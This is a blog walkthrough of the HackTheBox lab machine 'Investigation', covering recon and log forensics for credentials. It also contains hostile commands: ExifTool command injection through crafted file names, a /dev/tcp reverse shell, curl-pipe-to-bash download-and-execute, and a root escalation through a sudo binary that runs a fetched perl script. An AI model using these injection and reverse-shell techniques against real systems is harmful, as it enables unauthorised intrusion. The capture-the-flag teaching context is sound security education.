---
layout: post
title: HTB Investigation
cover-img: /assets/covers/Investigation.png
excerpt_separator: <!--more-->
tags: [HTB, HackTheBox, CVE, forensics, logs, linux, reversing]
comments: true
---
Investigation is a medium-difficulty machine released on HackTheBox.
<!--more-->

## Recon

Nmap shows ports 22 and 80 open. Port 80 redirects to http://eforenzics.htb:
```
❯ nmap -p- -sC -oN investigation.nmap 10.10.11.197
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 19:11 CEST
Nmap scan report for 10.10.11.197
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://eforenzics.htb/

Nmap done: 1 IP address (1 host up) scanned in 21.92 seconds
```

## Website

Looking at the website, it seems mostly like a static HTML. It offers an image forensics service:

![Index](/assets/screenshots/htb-investigation/index.png)

The site claims to provide detailed forensics analysis but only supports jpeg for now:

![Upload](/assets/screenshots/htb-investigation/upload.png)

This site uses PHP, so I tried to upload a PHP file, but predictably it failed:

![Error_no_jpg](/assets/screenshots/htb-investigation/error_no_jpg.png)

When I upload a valid JPG image, the site shares a link to http://eforenzics.htb/analysed_images/catjpg.txt and says the report will be deleted soon:

![Valid_jpg](/assets/screenshots/htb-investigation/valid_jpg.png)

Now, looking at the output reveals that the site uses [Exiftool](https://exiftool.org/) to perform the analysis:

![Exiftool](/assets/screenshots/htb-investigation/exiftool.png)

At the very top, it leaks version: **12.37**. Googling for *'exiftool 12.37 exploit'* shows [this](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) github gist, claiming that versions before 12.38 are vulnerable to RCE. The vulnerability is in the incorrect handling of the file name. If a file name ends with a pipe character `'|'`, and the file exists on the system, the file name will be treated as a command and executed. The gist provides a simple proof of concept:
```
$ ls pwn
ls: cannot access 'pwn': No such file or directory
$ touch 'touch pwn |'
$ ./exiftool 'touch pwn |'
ExifTool Version Number         : 12.37
File Name                       : touch pwn |
Directory                       : .
File Size                       : 0 bytes
File Modification Date/Time     : 2022:01:18 18:40:18-06:00
File Access Date/Time           : 2022:01:18 18:40:18-06:00
File Inode Change Date/Time     : 2022:01:18 18:40:18-06:00
File Permissions                : prw-------
Error                           : File is empty
$ ls pwn
pwn
```

To test this out, I am going to rename my cat.jpg image to curl payload:
```
❯ mv cat.jpg 'curl 10.10.14.198:8000 |'
```

I upload the image, and I get a callback on my webserver:
```
 ❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.197 - - [19/Apr/2023 20:22:15] "GET / HTTP/1.1" 200 -
```

## Foothold

Now that I know the RCE works, it is time to craft a payload for the reverse shell. I want to avoid special characters, so I am going to save the payload to a file:
```
❯ echo 'sh -i >& /dev/tcp/10.10.14.198/9999 0>&1' > rev
```
Now I encountered an obstacle because bash treats a `/` in the URL as a slash in file path and refuses to rename the file:
```
❯ mv 'curl 10.10.14.198:8000' 'curl 10.10.14.198:8000/rev -o rev'
mv: cannot stat 'curl 10.10.14.198:8000/rev -o rev': Not a directory
```
The solution is to rename the `rev` file to `index.html` and then make the request without any slashes:
```
❯ mv rev index.html
❯ mv 'curl 10.10.14.198:8000' "curl 10.10.14.198:8000 -o rev|"
```
Curl should download the `index.html` file when it is called like this and then save it as `rev `. I upload the file and get a hit on the webserver:
```
10.10.11.209 - - [19/Apr/2023 20:42:56] "GET / HTTP/1.1" 200 -
```

Now rename the file again, this time to execute the downloaded reverse shell:
```
❯ mv curl\ 10.10.14.198:8000\ -o\ rev\| 'bash rev|' 
```
But when I upload this file, I get no callback. Maybe the `rev` file gets deleted before execution? Anyway, I'm going to try to execute the shell script directly after downloading it:
```
mv curl\ 10.10.14.198:8000\ -o\ rev\| 'curl 10.10.14.198:8000 | bash|'
```

And when I upload this, I receive a connection back:
```
❯ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.197] 49972
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## User

I can't do much with the *www-data* user. There is another user, `smorton`:
```
cat /etc/passwd | grep bash 
root:x:0:0:root:/root:/bin/bash
smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
```
Looking at files owned by smorton that are readable by www-data, I came across an interesting file, `Windows Event Logs for Analysis.msg`, which is an Outlook message:
```
$ find / -user smorton 2>/dev/null  | grep -v -E "/proc|/sys|/run"
/home/smorton
/tmp/tmux-1000
/usr/local/investigation/Windows Event Logs for Analysis.msg
/dev/pts/1
/dev/pts/0
$ file /usr/local/investigation/Windows\ Event\ Logs\ for\ Analysis.msg 
/usr/local/investigation/Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
```

 I am going to transfer the file to my local machine. There is a very useful command line tool for transforming Outlook messages to .eml format, called [msgconvert](https://manpages.ubuntu.com/manpages/bionic/man1/msgconvert.1p.html) from `libemail-outlook-message-perl` pacakge. All I have to do is run the tool with the Outlook message as input, and I get an EML file!:
 ```
 ❯ msgconvert windows_event_logs.msg 
 ❯ file windows_event_logs.eml
windows_event_logs.eml: news or mail, ASCII text, with CRLF line terminators
```
Now the file is in plaintext format, and I can read it. The message asks Steve to inspect some logs, which are part of this email as an attachment:
>Hi Steve,
>
>Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. 
>
>Regards.
>Tom

The logs sound interesting. They are part of a file as a very long base64 encoded string. To extract attachments from the eml file, I am going to use [munpack](https://linux.die.net/man/1/munpack):
```
❯ munpack windows_event_logs.eml
)art1 (application/rtf
evtx-logs.zip (application/octet-stream)
```
The zip contained a file called `evtx-logs.zip`, which is a Windows event log:
```
❯ file security.evtx
security.evtx: MS Windows 10-11 Event Log, version  3.2, 238 chunks (no. 237 in use), next record no. 20013
```

I will move the event log to my Windows VM for analysis. Opening the logs in Event Viewer reveals that there are over 20 000 events: 

![Number_of_events](/assets/screenshots/htb-investigation/number_of_events.png)

I am going to need some filter. Looking back at the email, it mentioned something about users logging in. Looking at [Event IDs](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events) related to user logins, the interesting Event IDs are 4624 for successful login and 4625 for unsuccessful login. I am going to try to use this as a filter in Event Viewer: 

![Filter](/assets/screenshots/htb-investigation/filter.png)

There are only 90 events with this filter, so it's manageable to go through them manually. When looking at the events, I notice an interesting string in one of them:

![Fail](/assets/screenshots/htb-investigation/fail.png)

This is an event of a login failure, where the Account name was `Def@ultf0r3nz!csPa$$`. This looks like a common mistake, where the user mistakenly types his password into the username field. I can try to login with this password as smorton. It works, and I can get the user flag:
```
❯ ssh smorton@eforenzics.htb
smorton@eforenzics.htb's password: 
....
$ id
uid=1000(smorton) gid=1000(smorton) groups=1000(smorton)
$ cat user.txt 
b1c545d8*******************
```

## Root

When logging in as a new user, one of the first things to do is to run `sudo -l`, to see if this user can run commands as a different user. And it turns out *smorton* can run a strange binary as root:
```
sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

Running the binary as root only prints 'Exiting......':
```
$ sudo /usr/bin/binary
Exiting... 
```

It may be time to reverse-engineer this binary and see if I can exploit it.

My go-to tool for reversing binaries is [Ghidra](https://github.com/NationalSecurityAgency/ghidra). It is free and works most of the time. When decompiled, the binary is straightforward, having only one function, main():
```c

undefined8 main(int param_1,long param_2)

{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

I think Ghidra messed up the decompilation a bit since the main function is supposed to have a signature:
```c 
main(int argc, char** argv)
```
Where *argc* is the number of parameters and *argv* is an array of strings representing the parameters passed from the command line. For some reason, Ghidra thinks the second argument passed to main is of type *long*, and later on, it casts it to *char***. Anyway, with this in mind, lets see what this binary is about:
```c
__uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
```
This is just Ghidra declaring the variables it uses in the function.

```c
if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```
As mentioned before, *param_1* is the number of arguments. This checks if the number of arguments equals 3 and exits if it doesn't. The first argument will always be the executable's name, so I must pass two additional arguments.
```c
_Var1 = getuid();
if (_Var1 != 0) {
    puts("Exiting... ");
            /* WARNING: Subroutine does not return */
    exit(0);
}
```
This checks if the user running the binary has the UID 0, which is root. So I need to run this as root always.
```c
iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```
This if statement is complicated because of the Ghidra failure to deduce the type of *param_2*. The *strcmp* function compares two strings, the second being 'lDnxUysaQn'. To deduce the first string, it is important to remember how arrays are represented in C. When declaring an array in C, like this:
```c
int array[10];
```
The variable *array* holds a pointer to memory, where the values of *array* are stored sequentially. So, the `[]` operator in C dereferences the pointer and then uses the type of elements stored in the array to find the correct element. So, the following expression in C returns true:
```c
array[1] == *(array +1)
```
So, with this knowledge, I can deduce this:
```c
*(char **)(param_2 + 0x10) == param_2[2]
```
To explain: *param_2* is a pointer, so a large number. The code adds 16 (0x10 in hexadecimal) to it, then casts it to *char***, an array of strings. This is a 64-bit binary, so a pointer has the size of 8 bytes, so when *param_2* was pointing to the first string in the array, by adding 16 to it, it now points at the third string. All of this was a long way of saying that the third parameter needs to be a string 'lDnxUysaQn'.

So, now I know the three conditions to get the binary to execute:

- run as root
- 2 parameters
- 2nd parameter = lDnxUysaQn

Now running the binary to satisfy these conditions, it runs but exits immediately:
```
$ sudo /usr/bin/binary whatever lDnxUysaQn 
Running... 
Exiting...
```
So the checks are passed, but nothing happens still. Let's examine the binary further:
```c
puts("Running... ");
__stream = fopen(*(char **)(param_2 + 0x10),"wb");
uVar3 = curl_easy_init();
curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
curl_easy_setopt(uVar3,0x2711,__stream);
curl_easy_setopt(uVar3,0x2d,1);
iVar2 = curl_easy_perform(uVar3);
```
After passing the checks, it opens a file descriptor named with the second parameter in write mode. It then uses functions from [libcurl](https://curl.se/libcurl/c/allfuncs.html) to initiate a curl call.
The interesting lines are the *curl_easy_setopt* calls, which are used to tell curl how to behave.

The issue is that I have the numerical values of the options instead of their enum name. Anyway, I can use [curl.h](https://github.com/curl/curl/blob/master/include/curl/curl.h#L1105) and deduce what the option is. At the time of writing this, the enum of options starts at line 1105.

Ghidra says the numerical value of the first option is 10002 (0x2712 in hex). But that makes no sense since the options are numbered from 1-322. I assume this is another fail of Ghidra, and the option is actually 2. *CURLOPT_URL* has the value 2 and is used to set the URL curl should call. This option is necessary, so it makes sense. It sets the URL to *\*(param_2 + 8)*, the first command line argument.

For the next option, Ghidra says the value is 10001, so I assume it is actually 1, *CURLOPT_WRITEDATA*. This option accepts the file descriptor of the file where the curl output should be written. In this case, it's the second param.

For the third option, Ghidra finally gives a sensible value, 45. This is setting *CURLOPT_FAILONERROR* to true, telling curl to not output any data if it receives an HTTP response that indicates an error.

To sum it up, the binary will use curl to get an URL given by the first argument and save the output to a file with the name given by the second argument.

Now the code checks if curl call was successful, and it gets interesting:
```c
if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
    }
```
The first line is just a complicated way of getting the length of second parameter. You can see the documentation of [snprintf](https://cplusplus.com/reference/cstdio/snprintf/) to see why, but basically, if the second argument to *snprintf* is zero, the function returns the length of the string without the null terminating character. The code then allocates a buffer called *__s* with the size of the length of the second parametr and again uses *snprintf* to copy the second parameter to that buffer.

It then goes through the same process, this time creating a buffer *__s__00* and prepends 'perl ./' to it. The value of the second argument is fixed, so I know both of these values:

- __s = 'lDnxUysaQn'
- __s__00 = 'perl ./lDnxUysaQn'

Then the code does some cleanup, and finally, it sets its UID to 0 and calls `system` with the *__s__00* argument. 

Knowing all this, the exploit is very simple. I am just going to create a file with perl system() function to execute bash and start a Python webserver:
```
❯ echo 'system("bash");' > pwned
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now I just call the binary pointing it to my server and get root:
```
$ sudo /usr/bin/binary 'http://10.10.14.198:8000/pwned' lDnxUysaQn 
Running... 
root@investigation:/home/smorton# id
uid=0(root) gid=0(root) groups=0(root)
```